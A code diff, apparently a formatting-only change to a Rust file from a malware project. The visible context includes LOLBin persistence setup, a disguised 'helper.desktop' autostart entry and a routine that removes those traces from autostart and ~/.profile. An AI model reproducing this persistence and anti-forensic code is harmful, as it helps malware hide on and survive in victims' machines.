@@ -1,8 +1,8 @@
 use anyhow::Result;
 use std::env;
 use std::fs::{self, OpenOptions};
-use std::io::{BufRead, BufReader, Write, self};
-use std::path::{PathBuf, Path};
+use std::io::{self, BufRead, BufReader, Write};
+use std::path::{Path, PathBuf};
 
 #[cfg(target_os = "windows")]
 fn get_executable_path() -> PathBuf {
@@ -80,7 +80,6 @@ pub fn setup_persistence_lolbin() {
         Err(e) => eprintln!("Erreur copie exécutable : {}", e),
     }
 }
-
 
 pub fn add_to_autostart_gui() -> std::io::Result<()> {
     let autostart_dir = dirs::config_dir()
@@ -164,8 +163,8 @@ pub fn remove_all_traces() {
 
 #[cfg(target_os = "linux")]
 pub fn remove_all_traces() {
-    use std::fs;
     use std::env;
+    use std::fs;
     if let Some(config_dir) = dirs::config_dir() {
         let autostart = config_dir.join("autostart/helper.desktop");
         let _ = fs::remove_file(autostart);
@@ -173,7 +172,10 @@ pub fn remove_all_traces() {
     if let Ok(home) = env::var("HOME") {
         let profile_path = format!("{}/.profile", home);
         if let Ok(content) = fs::read_to_string(&profile_path) {
-            let exe_path = std::env::current_exe().unwrap().to_string_lossy().to_string();
+            let exe_path = std::env::current_exe()
+                .unwrap()
+                .to_string_lossy()
+                .to_string();
             let new_content: String = content
                 .lines()
                 .filter(|l| !l.contains(&exe_path))
